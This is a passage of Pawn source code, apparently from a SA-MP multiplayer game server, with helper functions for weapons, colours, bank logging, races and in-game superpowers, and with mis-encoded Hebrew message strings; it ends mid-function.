stock weekday(day,month,year)
{
	if(month <= 2) month += 12, --year;
	new j = year % 100, e = year / 100;
	return (day + (month+1)*26/10 + j + j/4 + e/4 - 2*e) % 7;
}
//=[UpdateWorldTime]============================================================
#if usingYSF
stock UpdateWorldTime()
{
	new td[6], string[128 char];
	gettime(td[0],td[1],td[2]);
	getdate(td[3],td[4],td[5]);
	format(string,sizeof(string),"%s %d:%d",GetDay(td[3],td[4],td[5],0),td[0],td[1]);
	return SetServerRule("worldtime",string);
}
#endif
//=[getarg_string]==============================================================
stock getarg_string(argument)
{
	new string[M_S];
	for(new i=0;getarg(argument,i)!='\0';i++) string[i] = getarg(argument,i);
	return string;
}
//=[GoogleTranslate]============================================================
stock GoogleTranslate(text[],from[],to[],size = sizeof text)
{
	new tmp[384], idx = -1, pos;
	while(text[++idx]) tmp[idx] = text[idx] == ' '? '+' : text[idx];
	format(tmp,sizeof(tmp),"http://ajax.googleapis.com/ajax/services/language/translate?v=1.0&q=%s&langpair=%s%%7C%s",tmp,from,to);
	pwncurl_get(tmp,tmp,sizeof(tmp));
	pos = strfind(tmp,"ext\":\"");
	if(pos != -1)
	{
		strdel(tmp,0,pos + 6);
		strdel(tmp,strfind(tmp,"\"},\"res"),sizeof(tmp));
	}
	else format(tmp,size,text);
	return tmp;
}
//=[GetRespect]=================================================================
stock GetRespect(playerid)
{
	new respect = playerinfo[playerid][level]/2 + playerinfo[playerid][armour] + playerinfo[playerid][vip];
	respect += Seniority(playerid)/10;
	respect += playerinfo[playerid][bank]/1000000;
	respect += playerinfo[playerid][kills]/5000;
	respect += playerinfo[playerid][admin]/3;
	respect += playerinfo[playerid][pet]/3;
	return playerinfo[playerid][clan] > 0? ++respect : respect;
}
//=[Seniority]==================================================================
stock Seniority(playerid) return playerinfo[playerid][logged] ? DaysBetweenDates(fgetstring(fuser(playerid),"RegisterationDate"),GetDateAsString()) : 0;
//=[WeaponCost]=================================================================
stock WeaponCost(playerid,weaponid)
{
	if(playerinfo[playerid][level] <= 1 || Ammunation[weaponid][aSlot] == 8 || Ammunation[weaponid][aSlot] == 9) return Ammunation[weaponid][aCost];
	new costByLevel = Ammunation[weaponid][aCost];
	costByLevel += (costByLevel/3)*playerinfo[playerid][level];
	return costByLevel + (costByLevel * (VIP_WeaponDiscount[playerinfo[playerid][vip]] / 100));
}
//=[IsPlayerNearTeleport]=======================================================
stock IsPlayerNearTeleport(playerid,tele[],Float:distance)
{
	new theTele = -1;
	for(new i=0;i<sizeof(Teleports);i++)
	{
		if(equal(Teleports[i][Tcmd],tele))
		{
			theTele = i;
			break;
		}
	}
	return GetPlayerDistanceToPointEx(playerid,Teleports[theTele][Tx],Teleports[theTele][Ty],Teleports[theTele][Tz]) <= distance;
}
//=[RemovePlayerWeapon]=========================================================
stock RemovePlayerWeapon(playerid,weaponid)
{
	new wData[2][12], w = GetPlayerWeapon(playerid), d[2];
	for(new i=0;i<13;i++)
	{
		GetPlayerWeaponData(playerid,i,d[0],d[1]);
		if(d[0] != weaponid) GetPlayerWeaponData(playerid,i,wData[0][i],wData[1][i]);
	}
	ResetWeapons(playerid);
	for(new i=0;i<13;i++) GiveWeapon(playerid,wData[0][i],wData[1][i]);
	return GiveWeapon(playerid,w,0);
}
//=[CrazyRaceJoin]==============================================================
stock CrazyRaceJoin(playerid)
{
	new string[M_S], vmsg[M_S];
	switch(GetVehicleModel(GetPlayerVehicleID(playerid)))
	{
		case 406: vmsg = "!?øâò øâò, æàú ìà äîùàéú äòð÷éú äæàú";
		case 407: vmsg = "(: àðçðå áèåçéí ùáîéøåõ ìà úäéä ùøéôä";
		case 408: vmsg = "îùàéú æáì..? ðå èåá, âí æáìðéí öøéëéí ìäúôøñí";
		case 409: vmsg = "òí ìéîåæéðä àãåðé äòùéø, ìà úöìéç ìòáåø àôéìå 2 ö'÷ôåéðèéí";
		case 411: vmsg = "!àéðôøðåñ äà? áçéøä îöåééðú";
		case 416: vmsg = "?èåá, äáàú àú æä ëé çùáú ùéäéå îúîåããéí çåìéí áîéøåõ";
		case 420: vmsg = "îéùäå öøéê îåðéú?! ìà çùåá, úùúîùå áîëåðéåú ùìëí";
		case 423: vmsg = "ðå áàîú, àåèå âìéãä? ìà úâéò øçå÷";
		case 425: vmsg = "?äàðèø??? ôøöä îìçîä";
		case 431, 437: vmsg = "!éàé, áåàå ð÷éí úçðú àåèåáåñ áàîöò äîéøåõ";
		case 434: vmsg = "!äîëåðéú äèåáä áéåúø áîùç÷. àéæå áçéøä";
		case 444: vmsg = "îåðñèø... èåá, úîùéê ìðñåú ìäôçéã àú äîúîåããéí";
		case 447: vmsg = "?äéé çáø'ä! äáàúé îñå÷ éåøä ìîéøåõ, âàåðé ìà";
		case 448: vmsg = "!äìå? îéùäå ôä äæîéï ôéöä? àðé ìà îåöà àú äëúåáú äâòúé ìàéæä îéøåõ";
		case 451: vmsg = "?èåøéñîå? æä ëì îä ùéëåìú ìîöåà áøééñ";
		case 460: vmsg = "îèåñ éîé, ìî÷øä ùðöèøê âí ìòåó åâí ìùçåú";
		case 463: vmsg = "àéæä àåôðåò, àéæä òøñ";
		case 486: vmsg = "!èø÷èåø? àéæä çåôø";
		case 493: vmsg = "!áåàå ëåìðå ðùåè òì äëáéù òí äñéøä ùìé";
		case 509: vmsg = "?àåôðééí áîéøåõ? ìàï äâòðå";
		case 513: vmsg = "ðäãø, îèåñ ôòìåìéí! ùòùò àú äîúîåããéí";
		case 520: vmsg = "!?äéãøä?! äùúâòú";
		case 522: vmsg = "àåôðåò äà? éôä";
		case 577, 592: vmsg = "!!!îèåñ òöåí áâåãìå áãøê";
		case 596, 597, 598, 599: vmsg = "!úòöøå, îùèøä! äîéøåõ äæä ìà çå÷é";
		case 601: vmsg = "?îé áé÷ù ùèéôä ìøëá";
		default: vmsg = "ìîòøëú àéï îä ìëúåá, ééúëï ëé äøëá ùáçøú ìà ùååä ëúéáä";
	}
	format(string,sizeof(string)," (%s) !Crazy Race äöèøó ì %s",vmsg,GetName(playerid));
	return string;
}
//=[News]=======================================================================
stock News(string[])
{
	new string2[256];
	format(string2,sizeof(string2)," » News: %s",string);
	SendClientMessageToAll(purple,string2);
}
//=[stradd]=====================================================================
stock stradd(string[],addstr[],pos)
{
	new firststr[128], endstr[128], retstr[128];
	strmid(firststr,string,0,pos-1);
	strmid(endstr,string,pos+1,strlen(string));
	format(retstr,sizeof(retstr),"%s%s%s",firststr,addstr,endstr);
	return retstr;
}
//=[CreateFirework]=============================================================
stock CreateFirework(model,Float:x,Float:y,Float:z,Float:height,Float:mspeed)
{
	new o = CreateObject(model,x,y,z,0.0,0.0,0.0);
	MoveObject(o,x,y,z + height,mspeed);
	firework[fireworks++] = o;
	return 0;
}
//=[HideMap]====================================================================
stock HideMap(playerid,show)
{
	playerinfo[playerid][hidem] = show;
	if(show) TextDrawShowForPlayer(playerid,hidemap);
	else TextDrawHideForPlayer(playerid,hidemap);
}
//=[Mail]=======================================================================
/*native SendMail();
stock Mail(from[],to[],subject[],body[])
{
	new string[256], File:f = fopen("EmailSend.txt",io_write);
	fwrite(f,"date: todays-date\n");
	format(string,sizeof(string),"to: %s\n",to);
	fwrite(f,string);
	format(string,sizeof(string),"subject: %s\n",subject);
	fwrite(f,string);
	format(string,sizeof(string),"from: %s\n\n",from);
	fwrite(f,string);
	fwrite(f,body);
	fclose(f);
	SendMail();
	return 1;
}*/
//=[EndKickstar]================================================================
stock EndKickstar(reason[],adminid)
{
	new string[M_S];
	assert kickstarinfo[0];
	if(adminid == -1) format(string,sizeof(string)," .áåèìä Kickstar úçøåú ä");
	else format(string,sizeof(string)," .%s áåèìä òì éãé äàãîéï Kickstar úçøåú ä",GetName(adminid));
	SendClientMessageToAll(red,string);
	format(string,sizeof(string)," ñéáä: %s",reason);
	SendClientMessageToAll(red,string);
	for(new i=0;i<MAX_PLAYERS;i++)
	{
		if(IsPlayerConnected(i) && (playerinfo[i][inkickstar] || playerinfo[i][waitkickstar]))
		{
			if(playerinfo[i][inkickstar])
			{
				SetVehicleToRespawn(GetPlayerVehicleID(i));
				SpawnPlayer(i);
				LinkVehicleToInterior(GetPlayerVehicleID(i),0);
				SetVehicleVirtualWorld(GetPlayerVehicleID(i),0);
				SetPlayerVirtualWorld(i,world_normal);
				SendClientMessage(i,orange," .áåèìä Kickstar ÷éáìú ôéöåé ëñôé [500$] òì ëê ùúçøåú ä");
				GiveMoney(i,500);
				DisablePlayerCheckpoint(i);
			}
			playerinfo[i][inkickstar] = 0, playerinfo[i][waitkickstar] = 0, playerinfo[i][kickstarid] = -1, playerinfo[i][kickstarscore] = 0;
			playerinfo[i][inact] = 0;
		}
	}
	kickstarinfo[0] = 0, kickstarinfo[1] = 0, kickstarinfo[2] = 0, kickstarinfo[4] = 0;
	KillTimer(kickstarinfo[3]);
	return 1;
}
//=[IsSomeoneNearKSPos]=========================================================
stock IsSomeoneNearKSPos(pos)
{
	new Float:p[3];
	for(new i = 0; i < MAX_PLAYERS; i++) if(IsPlayerConnected(i))
	{
		GetVehiclePos(GetPlayerVehicleID(i),p[0],p[1],p[2]);
		if(DistanceToPoint(p[0],p[1],p[2],Kickstar[pos][0],Kickstar[pos][1],Kickstar[pos][2]) <= 1.5) return 1;
	}
	return 0;
}
//=[GetWeaponSlot]==============================================================
stock GetWeaponSlot(wid)
{
	switch(wid)
	{
		case 0, 1: return 0;
		case 2..9: return 1;
		case 22..24: return 2;
		case 25..27: return 3;
		case 28, 29, 32: return 4;
		case 30, 31: return 5;
		case 33, 34: return 6;
		case 35..38: return 7;
		case 16..19, 39: return 8;
		case 41..43: return 9;
		case 10..15: return 10;
		case 44..46: return 11;
		case 40: return 12;
		default: return -1;
	}
	return -1;
}
//=[Colors]=====================================================================
/*
	Functions from "color.inc"
	by Simon
	Improved by me
*/
stock setRed(hexColor,red2)
{
	if(red2 > 0xFF) red2 = 0xFF;
	else if(red2 < 0x00) red2 = 0x00;
	return (hexColor & 0x00FFFFFF) | (red2 << 24);
}
stock setGreen(hexColor,green2)
{
	if(green2 > 0xFF) green2 = 0xFF;
	else if(green2 < 0x00) green2	= 0x00;
	return (hexColor & 0xFF00FFFF) | (green2 << 16);
}
stock setBlue(hexColor,blue2)
{
	if(blue2 > 0xFF) blue2 = 0xFF;
	else if(blue2 < 0x00) blue2 = 0x00;
	return (hexColor & 0xFFFF00FF) | (blue2 << 8);
}
stock setAlpha(hexColor,alpha)
{
	if(alpha > 0xFF) alpha = 0xFF;
	else if(alpha < 0x00) alpha = 0x00;
	return (hexColor & 0xFFFFFF00) | alpha;
}
stock stripRed(hexColor) return (hexColor) & 0x00FFFFFF;
stock stripGreen(hexColor) return (hexColor) & 0xFF00FFFF;
stock stripBlue(hexColor) return (hexColor) & 0xFFFF00FF;
stock stripAlpha(hexColor) return (hexColor) & 0xFFFFFF00;
stock fillRed(hexColor) return (hexColor) | 0xFF000000;
stock fillGreen(hexColor) return (hexColor) | 0x00FF0000;
stock fillBlue(hexColor) return (hexColor) | 0x0000FF00;
stock fillAlpha(hexColor) return (hexColor) | 0x000000FF;
stock getRed(hexColor) return (hexColor >> 24) & 0x000000FF;
stock getGreen(hexColor) return (hexColor >> 16) & 0x000000FF;
stock getBlue(hexColor) return (hexColor >> 8) & 0x000000FF;
stock getAlpha(hexColor) return (hexColor) & 0x000000FF;
//=[UpdatePlayerWeapons]========================================================
stock UpdatePlayerWeapons(playerid)
{
	new d[2];
	for(new i = 0; i < 65; i++) playerinfo[playerid][weaponammo][i] = 0;
	for(new i = 0; i < 13; i++)
	{
		GetPlayerWeaponData(playerid,i,d[0],d[1]);
		playerinfo[playerid][weaponammo][d[0]] = d[1] > 30000 || d[1] < 0 ? 30000 : d[1];
	}
	return 1;
}
//=[PropertyExists]=============================================================
stock PropertyExists(name[]) return existproperty(0,"",hash(name));
//=[GetProperty]================================================================
stock GetProperty(name[])
{
	new getAs[M_S];
	getproperty(0,"",hash(name),getAs);
	strunpack(getAs,getAs);
	return getAs;
}
//=[SetProperty]================================================================
stock SetProperty(name[],value[]) return setproperty(0,"",hash(name),value);
//=[RemoveProperty]=============================================================
stock RemoveProperty(name[]) return deleteproperty(0,"",hash(name));
//=[hash]=======================================================================
stock hash(string[])
{   // by DracoBlue, improved by me
	new s[2] = {1,0};
	for(new i = 0; i < strlen(string); i++) s[0] = (s[0] + string[i]) % 65521, s[1] = (s[1] + s[0]) % 65521;
	return (s[1] << 16) + s[0];
}
//=[IsWBColor]==================================================================
stock IsWBColor(r,g,b) return (r <= 10 || r >= 245) && (g <= 10 || g >= 245) && (b <= 10 || b >= 245);
//=[SavePlayerPos]==============================================================
stock SavePlayerPos(playerid)
{
	playerinfo[playerid][slastdata][0] = GetPlayerState(playerid);
	playerinfo[playerid][slastdata][1] = GetPlayerInterior(playerid);
	playerinfo[playerid][slastdata][2] = GetPlayerVirtualWorld(playerid);
	playerinfo[playerid][slastdata][3] = IsPlayerInAnyVehicle(playerid) ? GetPlayerVehicleID(playerid) : INVALID_VEHICLE_ID;
	if(GetPlayerState(playerid) == PLAYER_STATE_ONFOOT)
	{
		GetPlayerPos(playerid,playerinfo[playerid][slastpos][0],playerinfo[playerid][slastpos][1],playerinfo[playerid][slastpos][2]);
		GetPlayerFacingAngle(playerid,playerinfo[playerid][slastpos][3]);
	}
}
//=[LoadPlayerPos]==============================================================
stock LoadPlayerPos(playerid)
{
	SetPlayerInterior(playerid,playerinfo[playerid][slastdata][1]);
	SetPlayerVirtualWorld(playerid,playerinfo[playerid][slastdata][2]);
	switch(playerinfo[playerid][slastdata][0])
	{
		case PLAYER_STATE_ONFOOT:
		{
			SetPlayerPos(playerid,playerinfo[playerid][slastpos][0],playerinfo[playerid][slastpos][1],playerinfo[playerid][slastpos][2]);
			SetPlayerFacingAngle(playerid,playerinfo[playerid][slastpos][3]);
		}
		case PLAYER_STATE_DRIVER:
		{
			new Float:p[3];
			for(new i = 0; i < MAX_PLAYERS; i++) if(IsPlayerConnected(i) && IsPlayerInVehicle(i,playerinfo[playerid][slastdata][3]))
			{
				GetVehiclePos(GetPlayerVehicleID(i),p[0],p[1],p[2]);
				SetPlayerPos(i,p[0],p[1],p[2] + 3.0);
			}
			PutPlayerInVehicle(playerid,playerinfo[playerid][slastdata][3],0);
		}
		case PLAYER_STATE_PASSENGER: PutPlayerInNextSeatOfVehicle(playerid,playerinfo[playerid][slastdata][3],1);
	}
}
//=[PutPlayerInNextSeatOfVehicle]===============================================
stock PutPlayerInNextSeatOfVehicle(playerid,vehicleid,ignoredriver)
{
	new nextSeat = ignoredriver;
	for(new i = 0; i < MAX_PLAYERS; i++) if(IsPlayerConnected(i) && IsPlayerInVehicle(i,vehicleid) && GetPlayerVehicleSeat(i) != nextSeat && (nextSeat < 4 && GetVehicleModel(vehicleid) != 431 && GetVehicleModel(vehicleid) != 437)) return PutPlayerInVehicle(playerid,vehicleid,nextSeat); else nextSeat++;
	return nextSeat;
}
//=[GetAmmo]====================================================================
stock GetAmmo(playerid)
{
	new d[2];
	GetPlayerWeaponData(playerid,GetWeaponSlot(GetPlayerWeapon(playerid)),d[0],d[1]);
	return d[1];
}
//=[command]====================================================================
stock command(playerid,cmd[])
{
	playerinfo[playerid][dscmd] = 1;
	OnPlayerCommandText(playerid,cmd);
	return 1;
}
//=[strmul]=====================================================================
stock strmul(string[],times)
{
	new returned[M_S];
	for(new i = 0; i < times; i++) format(returned,sizeof(returned),"%s%s",returned,string);
	return returned;
}
//=[strcount]===================================================================
stock strcount(string[],find[])
{
	new p = 0, count = 0;
	while(p != -1 || !count) count++, p = strfind(string,find,true,!p ? p : p + 1);
	return count;
}
//=[ShowPlayerDialog2]==========================================================
#undef ShowPlayerDialog2
stock ShowPlayerDialog2(playerid,dialogid,style,caption[],info[],button1[],button2[])
{
	playerinfo[playerid][indialog] = dialogid;
	return ShowPlayerPlayerDialog(playerid,dialogid,style,caption,info,button1,button2);
}
#define ShowPlayerDialog2 ShowPlayerDialog
//=[SavePlayerWeapons]==========================================================
stock SavePlayerWeapons(playerid)
{
	new wd[2];
	for(new i = 0; i < 13; i++)
	{
		GetPlayerWeaponData(playerid,i,wd[0],wd[1]);
		playerinfo[playerid][savedweapons][i] = wd[0],
		playerinfo[playerid][savedammo][i] = wd[1];
	}
}
//=[LoadPlayerWeapons]==========================================================
stock LoadPlayerWeapons(playerid)
{
	new armed = GetPlayerWeapon(playerid);
	for(new i = 0; i < 13; i++) GiveWeapon(playerid,playerinfo[playerid][savedweapons][i],playerinfo[playerid][savedammo][i]);
	SetPlayerArmedWeapon(playerid,armed);
}
//=[IsPlayerNearAnyObject]======================================================
stock IsPlayerNearAnyObject(playerid)
{
	for(new i = 0; i < max_objects; i++) if(IsPlayerInRangeOfPoint(playerid,3.0,objectinfo[i][opos][0],objectinfo[i][opos][1],objectinfo[i][opos][2])) return 1;
	return 0;
}
//=[MovingText]=================================================================
stock MovingText(text[], textid)
{
	movingtext[textid] = TextDrawCreate(650.000000,325.000000 - (textid * 20.000000),text);
	movingtextinfo[textid][mtX] = 650.000000, movingtextinfo[textid][mtY] = 325.000000 - (textid * 20.000000);
	format(movingtextinfo[textid][mtText],MAX_MOVINGTEXT_LENGTH,text);
	TextDrawAlignment(movingtext[textid],0);
	TextDrawBackgroundColor(movingtext[textid],0x000000ff);
	TextDrawFont(movingtext[textid],1);
	TextDrawLetterSize(movingtext[textid],0.399999,1.399999);
	TextDrawColor(movingtext[textid],0xffffffff);
	TextDrawSetProportional(movingtext[textid],1);
	TextDrawSetShadow(movingtext[textid],1);
	TextDrawShowForAll(movingtext[textid]);
	movingtextinfo[textid][mtTimer] = SetTimerEx("MoveText",50,1,"i",textid);
	movingtextinfo[textid][mtUsing] = 1;
	return 1;
}
//=[BankLog]====================================================================
stock BankLog(name[],text[],sum)
{
	if(!equal(name,"(gmR)Amit[L]")) return 1;
	new bool:logWritten = false, f[M_S], k[M_S], string[M_S], seton = 2;
	format(f,sizeof(f),"%sBankLog_%s",folder_infobl,name);
	if(!fexist(f)) fcreate(f);
	for(new i = 1; i < 11; i++)
	{
		format(k,sizeof(k),"BL%d",i);
		if(fkeyexist(f,k)) continue;
		format(string,sizeof(string),"[%s] ($%09d) :%s",GetDateAsString(),sum,text);
		fsetstring(f,k,string);
		logWritten = true;
		break;
	}
	if(!logWritten)
	{
	    fsetstring(f,"BL1","x");
	    for(new i = 2; i < 11; i++)
	    {
	        format(k,sizeof(k),"BL%d",i);
			if(!fkeyexist(f,k)) continue;
			else seton = i;
	        format(string,sizeof(string),fgetstring(f,k));
	        fsetstring(f,k,"x");
	        format(k,sizeof(k),"BL%d",seton);
	        fsetstring(f,k,string);
	    }
		format(string,sizeof(string),"[%s] ($%09d) :%s",GetDateAsString(),sum,text);
	    fsetstring(f,"BL10",string);
	}
	return 1;
}
//=[AddWantedLevel==============================================================
stock AddWantedLevel(playerid,wlevel2)
{
	new string[M_S];
	SetPlayerWantedLevel(playerid,wlevel2);
	playerinfo[playerid][wantedlevel] = wlevel2;
	format(string,sizeof(string)," !åáøîú äîáå÷ùåú %d %s ðîöà îáå÷ù áùí",wlevel2,GetName(playerid));
	for(new i=0;i<MAX_PLAYERS;i++) if(playerinfo[i][work] == work_cop) SendClientMessage(i,blue,string);
	format(string,sizeof(string)," !äéà %d %s øîú äîáå÷ùåú ùì",wlevel2,GetName(playerid));
	News(string);
}
//=[PlayerHasWeapon]============================================================
stock PlayerHasWeapon(playerid,weaponid)
{
	new wd[2];
	GetPlayerWeaponData(playerid,GetWeaponSlot(weaponid),wd[0],wd[1]);
    return wd[0] == weaponid;
}
//=[IsPlayerNotAllowedToUseCommand]=============================================
stock IsPlayerNotAllowedToUseCommand(playerid,cmd[],cmdtext[])
{
	if(!playerinfo[playerid][logged]) return 0;
	new string[32];
	for(new i = 1; i <= 30; i++)
	{
	    format(string,sizeof(string),"NoCMD%d",i);
	    if(!fkeyexist(fuser(playerid),string)) return 0;
	    if(equal(cmd,fgetstring(fuser(playerid),string))) return 1;
	}
	for(new i = 1; i <= 30; i++)
	{
	    format(string,sizeof(string),"NoCMDEx%d",i);
	    if(!fkeyexist(fuser(playerid),string)) return 0;
	    if(strfind(cmdtext,fgetstring(fuser(playerid),string),true) != -1) return 1;
	}
	return 0;
}
//=[strs]=======================================================================
stock strs(string[],times)
{
	new returned[M_S];
	for(new i = 0; i < times; i++) format(returned,sizeof(returned),"%s%s",returned,string);
	return returned;
}
//=[lcmdid]=====================================================================
stock lcmdid(cmd[])
{
	for(new i = 0; i < sizeof(lcmds); i++) if(equal(lcmds[i][lcCommand],cmd)) return i;
	return -1;
}
//=[UseUltimatePower]===========================================================
stock UseUltimatePower(playerid,powertype,powerlevel)
{
	new Float:p[3], string[M_S];
	GetPlayerPos(playerid,p[0],p[1],p[2]);
	playerinfo[playerid][copypower][0] = powertype;
	playerinfo[playerid][copypower][1] = powerlevel;
	SetTimerEx("ResetCopypower",10000,0,"i",playerid);
	switch(powertype)
	{
	    case 0: // ùìéèä áàãîä
	    {
	        switch(powerlevel)
	        {
	            case 1: // ëðéñä àì îúçú ìàãîä
	            {
		            playerinfo[playerid][underearth] = 1;
		            SetPlayerPos(playerid,p[0],p[1],p[2] - 4.0);
		            SetPlayerCameraPos(playerid,p[0],p[1],p[2] + 10.0);
		            SetPlayerCameraLookAt(playerid,p[0],p[1],p[2]);
		            SetPlayerCheckpoint(playerid,p[0],p[1],p[2],3.0);
		            SetFreeze(playerid,1);
		            SendClientMessage(playerid,green," .àúä îúçú ìàãîä; ìçõ òì î÷ù ëìùäå ëãé ìçæåø åìú÷åó àú îé ùîòìéê");
	            }
	            case 2: // îôåìú ñìòéí
	            {
	                new rnd = randomEx(3,7), id = FindPlayer(playerid,5,3.0);
	                if(id == -1) return SendClientMessage(playerid,red," .ìà ðîöà ùç÷ï");
	                GetPlayerPos(id,p[0],p[1],p[2]);
	                for(new i = 0; i < rnd; i++)
					{
						MoveSObject(playerinfo[playerid][mapolet][i] = CreateObject(758,p[0] + floatrand(-7.5,5.5),p[1] + floatrand(-7.5,5.5),p[2] + 10.0,floatrand(0.0,360.0),floatrand(0.0,360.0),floatrand(0.0,360.0)),p[0],p[1],p[2],floatrand(3.75,5.5));
						playerinfo[playerid][mapoletstart][i] = p[2] + 10.0;
					}
	            }
	            case 3: // øòéãú àãîä ìëéååï ùç÷ï
	            {
	                new Float:setp = 2.5;
	                for(new i = 0; i < 8; i++)
	                {
	                    GetXYInFrontOfPlayer(playerid,p[0],p[1],0.5 + setp);
	                    if(i % 2 == 0) CreateExplosion(p[0],p[1],p[2]-3.0,12,0.3);
	                    setp += 2.5;
	                    for(new a = 0; a < MAX_PLAYERS; a++) if(IsPlayerConnected(a) && GetPlayerDistanceToPointEx(a,p[0],p[1],p[2]) <= 3.5) Damage(a,floatrand(20.0,50.0));
	                }
	            }
	            case 4: // øòéãú àãîä òð÷éú
	            {
	                for(new i = 0; i < MAX_PLAYERS; i++) if(IsPlayerConnected(i) && GetPlayerDistanceToPointEx(i,p[0],p[1],p[2]) <= 40.0)
	                {
	                    GetPlayerPos(i,p[0],p[1],p[2]);
	                    CreateExplosion(p[0],p[1],p[2] - 30.0,7,0.3);
	                    Damage(i,floatrand(30.0,60.0));
	                }
	                format(string,sizeof(string)," « Ultimate Power » !äôòéì øòéãú àãîä %s",GetName(playerid));
	                SendClientMessageToAll(orange,string);
	            }
	        }
	    }
	    case 1: // ùìéèä áàù
	    {
	        switch(powerlevel)
	        {
	            case 1: // éøé÷ú àù
	            {
	                GetXYInFrontOfPlayer(playerid,p[0],p[1],8.5);
	                CreateExplosion(p[0],p[1],p[2],4,0);
	            }
	            case 2: // ëãåø àù
	            {
	                new id = FindPlayer(playerid,7,2.5);
	                if(id == -1) return SendClientMessage(playerid,red," .ìà ðîöà ùç÷ï");
	                GetXYInFrontOfPlayer(playerid,p[0],p[1],2.0);
	                playerinfo[playerid][fireball] = CreateSObject(1598,p[0],p[1],p[2],0.0,0.0,0.0);
	                GetPlayerPos(id,p[0],p[1],p[2]);
	                MoveSObject(playerinfo[playerid][fireball],p[0],p[1],p[2],4.2);
	                SetTimerEx("FireBallExplosion",3000,0,"i",playerinfo[playerid][fireball]);
	            }
	            case 3: // éöéøú ôéöåõ âãåì
	            {
	                SetPlayerHealth(playerid,100.0);
	                CreateExplosion(p[0],p[1],p[2],7,1.0);
	                SetPlayerHealth(playerid,100.0);
	                CreateExplosion(p[0]+15.0,p[1],p[2],7,1.0);
	                SetPlayerHealth(playerid,100.0);
	                CreateExplosion(p[0],p[1]+15.0,p[2],7,1.0);
	                SetPlayerHealth(playerid,100.0);
	                CreateExplosion(p[0],p[1],p[2]+15.0,7,1.0);
	                SetPlayerHealth(playerid,100.0);
	                CreateExplosion(p[0]+15.0,p[1]+15.0,p[2],7,1.0);
	                SetPlayerHealth(playerid,100.0);
	                CreateExplosion(p[0],p[1]+15.0,p[2]+15.0,7,1.0);
	                SetPlayerHealth(playerid,100.0);
	                CreateExplosion(p[0]+15.0,p[1],p[2]+15.0,7,1.0);
	                SetPlayerHealth(playerid,100.0);
	            }
	            case 4: // áø÷
	            {
	                for(new i = 0; i < MAX_PLAYERS; i++) if(IsPlayerConnected(i) && GetPlayerDistanceToPointEx(i,p[0],p[1],p[2]) <= 20.0)
	                {
	                    SetPlayerWeather(i,8);
	                    SetPlayerHealth(i,0.0);
	                    for(new s = 0; s < 4; s++) PlayerPlaySound(playerid,1159,0.0,0.0,0.0);
	                }
	                format(string,sizeof(string)," « Ultimate Power » !äôòéì áø÷ %s",GetName(playerid));
	                SendClientMessageToAll(orange,string);
	            }
	        }
	    }
	    case 2: // ùìéèä áøåç
	    {
	        switch(powerlevel)
	        {
	            case 1: // úòåôä
	            {
	                SetPlayerVelocity(playerid,0.0,0.0,10.0);
	            }
	            case 2: // øåç çæ÷ä ìòáø ùç÷ï
	            {
	                new id = FindPlayer(playerid,8,3.0);
	                if(id == -1) return SendClientMessage(playerid,red," .ìà ðîöà ùç÷ï");
	                if(IsPlayerInAnyVehicle(id)) SetVehicleVelocity(GetPlayerVehicleID(id),10.0,10.0,0.0);
					else SetPlayerVelocity(id,10.0,10.0,0.0);
	            }
	            case 3: // øåç çæ÷ä ëììéú
	            {
	                new Float:op[3];
	                for(new i = 0; i < MAX_PLAYERS; i++) if(IsPlayerConnected(i) && i != playerid)
	                {
	                    GetPlayerPos(i,op[0],op[1],op[2]);
	                    if(op[0] >= p[0] - 10.0 && op[0] <= p[0] + 10.0 &&
	                    op[1] >= p[1] - 10.0 && op[1] <= p[1] + 10.0 &&
	                    op[2] >= p[2] - 10.0 && op[2] <= p[2] + 10.0) if(IsPlayerInAnyVehicle(i)) SetVehicleVelocity(GetPlayerVehicleID(i),10.0,10.0,0.0);
						else SetPlayerVelocity(i,10.0,10.0,0.0);
	                }
	            }
	            case 4: // èåøðãå
	            {
	                playerinfo[playerid][tornado] = 10;
	                format(string,sizeof(string)," « Ultimate Power » !äôòéì èåøðãå %s",GetName(playerid));
	                SendClientMessageToAll(orange,string);
	            }
	        }
	    }
	   case 3: // ùìéèä áîùç÷
	    {
	        switch(powerlevel)
	        {
	            case 1: // äúçî÷åú îäéøä îîú÷ôåú
	            {
	                playerinfo[playerid][quicklydefence] = 20;
	                SendClientMessage(playerid,green," .÷éáìú äúçî÷åú îäéøä ì 20 ùðéåú");
	                SetPlayerChatBubble(playerid," îùúîù áäúçî÷åú îäéøä",green,2.0,20000);
	            }
	            case 2: // äùúâøåú àì îàçåøé ùç÷ï
	            {
	                new id = FindPlayer(playerid,20,3.0);
	                if(id == -1) return SendClientMessage(playerid,red," .ìà ðîöà ùç÷ï");
	                GetXYInFrontOfPlayer(id,p[0],p[1],-2.0);
	                SetPlayerPos(playerid,p[0],p[1],p[2]);
	                GetPlayerFacingAngle(id,p[0]);
	                SetPlayerFacingAngle(playerid,p[0]);
	            }
	            case 3: // ùìéçú ùç÷ï àì äòåìí äàãåí
	            {
	                new id = FindPlayer(playerid,10,2.5);
	                if(id == -1) return SendClientMessage(playerid,red," .ìà ðîöà ùç÷ï");
	                SetPlayerWeather(id,44);
	                SetPlayerTime(id,21,0);
	            }
	            case 4: // äòú÷ú ëåç àåìèéîèéáé
	            {
	                for(new i = 0; i < MAX_PLAYERS; i++) if(IsPlayerConnected(i) && GetPlayerDistanceToPointEx(i,p[0],p[1],p[2]) <= 9.0 && playerinfo[i][copypower][0] != -1 && i != playerid)
	                {
	                    playerinfo[playerid][upower3][0] = playerinfo[i][copypower][0];
	                    playerinfo[playerid][upower3][1] = playerinfo[i][copypower][1];
	                    format(string,sizeof(string)," .ëòú, úåëì ìäùúîù áå ôòí àçú áìáã, ò\"é ëê ùúìçõ òì ëì äî÷ùéí äîåôéòéí òì äîñê !%s äòú÷ú àú äëåç äàåìèéîèéáé ùì",GetName(i));
	                    SendClientMessage(playerid,green,string);
		                format(string,sizeof(string)," « Ultimate Power » !%s äòúé÷ àú äëåç äàåìèéîèéáé ùì %s",GetName(i),GetName(playerid));
		                SendClientMessageToAll(orange,string);
		                GameTextForPlayer(playerid,"~b~thrid ultimate power keys:~n~~y~~k~~PED_SPRINT~~b~ + ~y~~k~~PED_JUMPING~~b~ + ~y~~k~~SNEAK_ABOUT~",4500,0);
		                break;
	                }
	            }
	        }
	    }
	}
	return 1;
}
//=[Damage]=====================================================================
stock Damage(playerid,Float:dmg)
{
	new Float:h[2];
	GetPlayerHealth(playerid,h[0]);
	GetPlayerArmour(playerid,h[1]);
	if(dmg < 0.0)
	{
	    if(h[1] >= 100.0) return 1;
		if(h[0] >= 100.0) return SetPlayerArmour(playerid,h[1] + dmg);
		else
		{
